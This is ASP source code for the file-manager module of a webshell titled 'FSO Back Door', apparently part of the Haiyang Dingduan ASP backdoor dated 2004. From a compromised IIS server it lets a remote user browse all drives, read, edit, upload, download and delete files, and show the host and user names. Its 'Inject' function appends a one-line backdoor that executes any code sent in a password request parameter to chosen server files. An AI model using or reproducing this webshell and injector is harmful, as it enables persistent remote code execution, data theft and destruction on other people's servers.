<%
	option explicit
%>
<!--#include file="config.asp"-->
<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<!-- PageFSO Below -->
<%
	pageFso()
	
	sub pageFso()
		dim key,list,path,theAct,toPath,thePath,driveStr,fileName,fileContent
		isIn(2)
		key=request("key")
		path=request("path")
		theAct=request("theAct")
		toPath=request("toPath")
		thePath=request("thePath")
		fileName=request("fileName")
		fileContent=request("fileContent")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
		
		if path="" then
			path=thePath
		end if
		
		showTitle("FSO操作页面")
		
		select case theAct
			case "inject"
				fsoInject(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "edit"
				fsoEditFile(thePath)
				response.end
			case "save"
				fsoSaveToFile thePath,fileContent
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "delFile"
				fsoDelFile(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "delFolder"
				fsoDelFolder(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "saveAs"
				fsoSaveAs thePath,toPath
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "createFile"
				if not fso.fileExists(thePath&"\"&request("theName")) then
					fso.createTextFile thePath&"\"&request("theName")
					chkErr err,err.description
				end if
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "createFolder"
				if not fso.folderExists(thePath&"\"&request("theName")) then
					fso.createFolder thePath&"\"&request("theName")
					chkErr err,err.description
				end if
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "searchFolder"
				set path=fso.getFolder(path)
				searchFolder path,key
				response.end
			case "upload"
				streamUpload thePath,fileName
				echo "<script language=""javascript"">location.href='?pageName=fso&thePath="&encodeForUrl(thePath,true)&"';</script>"
		end select

		for each list in fso.drives
			driveStr=driveStr&"<a href=""?pageName=fso&thePath="&list.driveLetter&":\"">"&list.driveLetter&"盘:</a> "
		next
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="4" class="td">&nbsp;<%=request.serverVariables("server_name")%> - FSO Back Door</td>
  </tr>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=fso">
    <tr> 
      <td colspan="4" class="td">&nbsp;切换盘符: <%=driveStr%> 本机局域网地址： 
        <%
			on error resume next
        	echo "\\"&net.computerName&"\"&net.userName
			if err then
				err.clear
				echo err.description
			end if
		%>
	  </td>
    </tr>
    <tr> 
      <td colspan="4" class="td">&nbsp;PATH: 
        <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="60"> 
        <input type="submit" name="Submit3" value="查 看" onclick="location.href='?pageName=fso&thePath='+this.form.thePath.value;this.disabled=true;">
      </td>
    </tr>
  </form>
  <form method="post" action="?pageName=fso&theAct=searchFolder" onsubmit="if(this.key.value==''){alert('请填写关键字!');return false;}else{this.Submit5.disabled=true;}" target="_blank">
    <tr> 
      <td colspan="4" class="td">&nbsp;在 
        <input name="path" type="text" id="path" value="<%=path%>">
        中查找 
        <input name="key" type="text" id="key" value="<%=key%>"> <input type="submit" name="Submit5" value="用于查找存在的木马"></td>
    </tr>
  </form>
  <form method="post">
    <tr> 
      <td colspan="4" class="td">&nbsp; <input name="theName" type="text" id="theName2" size="39"> 
        <input type="button" name="Submit2" value="新建文件" onClick="if(this.form.theName.value==''){alert('请填写文件名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFile&theName='+this.form.theName.value;this.disabled=true;}"> 
        <input type="button" name="Submit4" value="新建目录" onClick="if(this.form.theName.value==''){alert('请填写文件夹名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFolder&theName='+this.form.theName.value;this.disabled=true;}"> 
        <span class="warningColor">〖新建文件和新建目录不能同名〗</span></td>
    </tr>
  </form>
  <form method="post" enctype="multipart/form-data" action="?pageName=fso&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
    <tr> 
      <td colspan="4" class="td">&nbsp; <input name="file" type="file" size="25">
        保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="35"> 
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
      </td>
    </tr>
  </form>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td width="30%" rowspan="2" valign="top" class="td"> 
      <%call fsoGetFolderList(thePath,true)%>
    </td>
  </tr>
  <tr> 
    <td width="555" colspan="3" valign="top"> 
		  <%call fsoGetFolderList(thePath,false)%>
      <div id="loaded" style="display:none;"> 
        <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe>
      </div></td>
  </tr>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="4" class="td">Powered By Allen &amp; LCX 2004.11&nbsp;</td>
  </tr>
</table>
<a name="foot"></a>
<%
		showExecuteTime()
	end sub
	
	sub fsoEditFile(thePath)
		dim theFile
		on error resume next
		set theFile=fso.openTextFile(thePath,1,false)
		if err then
			echo "错误:"&err.description
			err.clear
			response.end
		end if
%>
<table border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=fso&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
    <tr>
      <td><input name="thePath" type="text" id="thePath3" value="<%=thePath%>" size="50"> 
        <input type="button" name="Submit62" value="查 看" onclick="location.href='?pageName=fso&theAct=edit&thePath='+this.form.thePath.value;this.disabled=true;"></td>
    </tr>
    <tr> 
      <td><textarea name="fileContent" cols="70" rows="25" id="fileContent"><%=server.htmlEncode(theFile.readAll())%></textarea></td>
    </tr>
    <tr> 
      <td height="50" align="right"> <input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}"> 
        <input type="reset" value="重 置">
        &nbsp; </td>
    </tr>
  </form>
</table>
<%
		set theFile=nothing
		
		showExecuteTime()
	end sub

	sub fsoGetFolderList(thePath,showFolder)
		dim ext,flag,list,theHref,theFiles,fileName,theFolder,theFolders
		
		if not fso.folderExists(thePath) then
			onErr("路径错误或者盘空或者没有权限的访问!")
		end if
		
		if len(thePath)=2 then
			thePath=thePath&"\"
		end if
		
		set theFolder=fso.getFolder(thePath)
		set theFiles=theFolder.files
		set theFolders=theFolder.subFolders

		if showFolder=true and getParentFolder(thePath)<>"" then
			echo "&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(getParentFolder(thePath),false)&"""><font class=warningColor>↑回上级目录</font></a><br>"
		end if

		if showFolder=true then
			for each list in theFolders
				echo "&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(list.path,false)&"""><font class=font-list>└■</font> "
				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")&""
				echo "</a> <a href=javascript:; onclick=""fso_delFolder('"&encodeForUrl(list.path,true)&"','"&encodeForUrl(list.path, False)&"')"">×删除</a><br>"
			next
		 else
			echo "<table width=""98%"" border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"">"
			echo "<tr><td align=""center"" class=""td"">文件名 (鼠标移到文件名可以查看给文件的属性)</TD>"
			echo "<TD align=""center"" class=""td"">大小</TD>"
			echo "<TD align=""center"" class=""td"">文件操作</TD></tr>"
			for each list in theFiles
				ext=split(list.path,".")(uBound(split(list.path,".")))
				flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
				fileName=replace(replace(lcase(list.path),lcase(thePath),""),"\","")
				if instr(lcase(list.path),lcase(server.mapPath("\"))) then
					theHref=mid(replace(lcase(list.path),lcase(server.mapPath("\")),""),2)
					echo "<tr onmouseover=""this.className='td';"" onmouseout=""this.className=''""><td>&nbsp;<font class=font-list>□</font>"
					echo "<a href=""\"&encodeForUrl(theHref,false)&""" title=""文件名: "&fileName&chr(13)&"类型: "&list.type&chr(13)&"属性: "&list.Attributes&chr(13)&"时间："&list.DateLastModified&""" target=""_blank"">"
					if getStrLen(fileName)>40 then
						fileName=getCutStr(fileName,40)&".."
					end if
					echo fileName&"</a></td>"
				 else
					echo "<tr onmouseover=""this.className='td';"" onmouseout=""this.className=''""><td>&nbsp;<font class=font-list>□</font>"
					echo "<font style=""cursor: hand;"" title=""文件名: "&fileName&chr(13)&"类型: "&list.type&chr(13)&"属性: "&list.Attributes&chr(13)&"时间："&list.DateLastModified&""">"
					if getStrLen(fileName)>40 then
						fileName=getCutStr(fileName,40)&".."
					end if
					echo fileName&"</font></td>"
				end if
				echo "<td align=center>" & getTheSize(list.size) & "</td><td align=center>"
				if flag>0 then
					echo "<a href=#foot onclick=""fso_editIt('" & encodeForUrl(list.path, False) & "');""><font class=warningColor>Edit</font></a> "
				end if
				echo "<a href=javascript:; onclick=""fso_saveAs('"&encodeForUrl(list.path,true)&"','" & encodeForUrl(list.path, False) & "');""><font class=warningColor>SaveAs</font></a> "
				echo "<a href=javascript:; onclick=""stream_downIt('"&encodeForUrl(list.path, False)&"');""><font class=warningColor>Down</font></a> "
				echo "<a href=javascript:; onclick=""fso_delFile('"&encodeForUrl(list.path,true)&"','" & encodeForUrl(list.path, False) & "')""><font class=warningColor>Del</font></a> "
				if flag>0 then
					echo "<a href=javascript:; onclick=""fso_inject('"&encodeForUrl(list.path,true)&"','" & encodeForUrl(list.path, False) & "')""><font class=warningColor>Inject</font></a>"
				end if
				echo "</td></tr>"&vbNewline
			next
			echo "</table>"
		end if
	end sub
	
	sub fsoSaveAs(thePath,toPath)
		if lTrim(thePath)=lTrim(toPath) then
			echo "<script>alert('源路径与目标路径相同,操作停止!');</script>"
			response.end
		end if
	 	if fso.fileExists(thePath) then 
			fso.copyFile thePath,toPath
			echo "<script language=""javascript"">alert('另存为操作成功!');</script>"
		 else
			echo "<script>alert('请确认源文件存在！');history.back();</script>"
		end if
	end sub
	
	sub fsoInject(thePath)
		dim theFile
		set theFile=fso.openTextFile(thePath,8,True,0)
		theFile.writeLine(" <script language=""vbscript"" runat=server>if request("""&clientPassword&""")<>"""" then execute(request("""&clientPassword&"""))</script>")
		theFile.close
		echo "<script language=""javascript"">alert('插入成功!请用海阳顶端网asp后门来访问你插入的文件"&request("path")&"');</script>"
		set theFile=nothing
	end sub
	
	sub fsoSaveToFile(thePath,fileContent)
		dim theFile
		set theFile=fso.openTextFile(thePath,2,true)
		theFile.write fileContent
		theFile.close
		echo "文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]"
		set theFile=nothing
	end sub
	
	sub fsoDelFile(thePath)
		dim theFile
		set theFile=fso.getFile(thePath)
		theFile.delete true
		set theFile=nothing
	end sub
	
	sub fsoDelFolder(thePath)
		fso.deleteFolder thePath,true
	end sub
	
	sub searchFolder(folder,str)
		dim ext,n,title,theFile,theFolder
		for each theFile In folder.Files
			ext=split(theFile,".")(uBound(split(theFile,".")))
			if lcase(ext)="asp" or lcase(ext)="asa" or lcase(ext)="cer"  or lcase(ext)="cdx" then
				if searchFile(theFile,str,title) then
					echo fileLink(theFile,title)
					n=n+1
				end if
			end if
		next
		for each theFolder in folder.subFolders
			searchFolder theFolder,str
		next
	end sub
	
	function searchFile(f,s,title)
		dim fo,content,pos1,pos2
		set fo=fso.openTextFile(f)
		on error resume next
		content=fo.ReadAll()
		fo.close
		if err then
			err.clear
			content=""
		end if
		searchFile=instr(1,content,S,vbTextCompare)>0 
		if searchFile then
			pos1=instr(1,content,"<TITLE>",vbTextCompare)
			pos2=instr(1,content,"</TITLE>",vbTextCompare)
			title=""
			if pos1>0 and pos2>0 then
				title=mid(content,pos1+7,pos2-pos1-7)
			end if
		end if
		set fo=nothing
	end function
	
	function fileLink(f,title)
		fileLink=f.path
		if title="" then
			title=f.Name
		end if
		fileLink="<UL>·"&title&" "&fileLink&"</UL>"
	end function
%>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">